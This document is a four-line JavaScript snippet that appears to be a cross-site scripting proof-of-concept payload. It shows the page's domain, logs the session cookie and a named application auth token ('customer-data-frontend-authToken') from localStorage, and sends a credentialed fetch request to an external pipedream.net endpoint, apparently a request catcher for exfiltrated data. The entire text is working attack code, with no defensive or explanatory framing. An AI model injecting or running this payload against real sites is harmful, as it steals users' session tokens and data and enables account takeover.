alert(document.domain);
console.log(document.cookie);
console.log(localStorage.getItem("customer-data-frontend-authToken"));
fetch("https://eolzili6viattmf.m.pipedream.net", { credentials: "include" })
